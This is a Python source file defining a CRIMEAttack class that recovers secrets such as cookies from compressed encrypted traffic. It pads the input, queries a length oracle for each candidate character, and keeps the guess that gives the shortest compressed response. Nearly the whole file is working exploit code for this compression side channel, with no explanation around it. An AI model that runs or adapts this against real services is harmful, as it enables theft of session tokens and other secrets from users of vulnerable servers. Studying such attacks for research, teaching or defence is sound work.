import struct
import string

import logging
log = logging.getLogger(__name__)


alphabet = (string.ascii_lowercase + string.ascii_uppercase + string.digits + '=/+' + ':;').encode()
padding_chars = ')(\{\}\\[]<%@#^`~$*!|`'[::-1].encode() + b'>.\'_,?;:+-='

class CRIMEAttack(object):
    def __init__(self, oracle, alphabet=alphabet, padding_chars=padding_chars):
        self.oracle = oracle
        self.alphabet = alphabet
        self.padding_chars = padding_chars


    
    def execute(self, known_plaintext):
        plaintext = known_plaintext

        padding = self._find_padding(plaintext)

        if padding == None:
            raise Exception("No suitable padding found")

        ctr = 0
        while True:
            log.debug('Attempt format of "{}"'.format((plaintext + b'{}' + padding).decode()))
            padded_sizes = [(struct.pack('B', char), self.oracle.request((plaintext + struct.pack('B', char)) + padding)) for char in self.alphabet]

            sorted_sizes = sorted(padded_sizes, key=lambda req: req[1])
            log.debug('Sizes for iteration {}: {}'.format(ctr, sorted_sizes))

            if sorted_sizes[0][1] == sorted_sizes[1][1]:
                return plaintext
            else:
                plaintext += sorted_sizes[0][0]

            ctr += 1




    def _find_padding(self, payload):
        reference_len = self.oracle.request(payload)
        padding = b''

        log.debug('Attempting to find padding')

        for char in self.padding_chars:
            padding += struct.pack('B', char)
            new_len = self.oracle.request(payload + padding)

            if new_len > reference_len:
                padding = padding[:-1]
                log.debug('Found suitable padding "{}"'.format(padding.decode()))
                return padding
        